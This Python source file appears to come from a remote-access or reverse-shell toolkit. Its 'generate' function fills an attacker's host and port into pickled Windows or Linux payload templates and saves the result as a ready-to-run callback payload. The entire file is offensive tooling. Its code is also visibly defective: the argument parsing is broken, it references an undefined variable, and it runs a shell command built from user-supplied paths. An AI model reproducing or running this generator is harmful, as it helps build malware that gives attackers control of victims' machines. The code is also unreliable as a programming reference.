import sys
import fileinput
import subprocess
from pickle import load
from os import path as P


def generate(data=''):
    try:
        data = data.split('-')
        del data[0]
        for attr in data:
            if 'os ' in attr:
                plt = (data[0].replace('os ', '')).replace(' ', '')
            if 'lhost  ' in attr:
                host = (data[1].replace('lhost ', '')).replace(' ', '')
            if 'lport ' in attr:
                port = int(data[2].replace('lport ', ''))
                path = P.abspath(data[3].replace('outfile ', ''))
            if 'outfile ' in attr:
                name = P.basename(path)
            else:
                print("\nInvalid arguments!")
                print("Enter 'generate -h' to view full usage")
                return
    except:
        print()
        print(f"\n[{g.r}Error{g.e}] Invalid arguments...")
        print(f"[{g.bl}Fix{g.e}] Enter generate --help to view usage")
        return
    if not P.exists(path.replace(name, '')):
        print(f"\nOutfile directory '{path.replace(name, '')}' doesn't exist")
        return
    try:
        if plt == 'win':
            print("\nGenerating Windows payload...\n")
            with open(r'sources/templates/win.bin', 'rb') as win:
                data = load(win)
                win.close()
            with open(r'sources/templates/win.py', 'w') as file:
                file.write(data)
                file.close()
            for line in fileinput.input(r'sources/templates/win.py', inplace=True):
                l1 = "host = ip"
                l2 = "port = prt"
                if l1 in line:
                    line = line.replace(l1, f"host = '{host}'")
                if l2 in line:
                    line = line.replace(l2, f"port = {port}")
                sys.stdout.write(line)
            subprocess.run(f'move sources\\templates\\win.py "{path}"', capture_output=True, shell=True)
            print(f"Windows Payload generated and saved as '{path}'")
        elif plt == 'linux':
            print("\nGenerating Linux payload...\n")
            with open(r'sources/templates/linux.bin', 'rb') as linx:
                data = load(linx)
                linx.close()
            with open(r'sources/templates/linux.py', 'w') as file:
                file.write(data)
                file.close()
            for line in fileinput.input(r'sources/templates/linux.py', inplace=True):
                l1 = "host = ip"
                l2 = "port = prt"
                if l1 in line:
                    line = line.replace(l1, f"host = '{host}'")
                if l2 in line:
                    line = line.replace(l2, f"port = {port}")
                sys.stdout.write(line)
            subprocess.run(f'move sources\\templates\\linux.py "{path}"', capture_output=True, shell=True)
            print(f"Linux Payload generated and saved as '{path}'")
        else:
            print('\nInvalid platform!')
            print("Enter 'generate -h' to view full usage")
    except Exception as e:
        print(e)
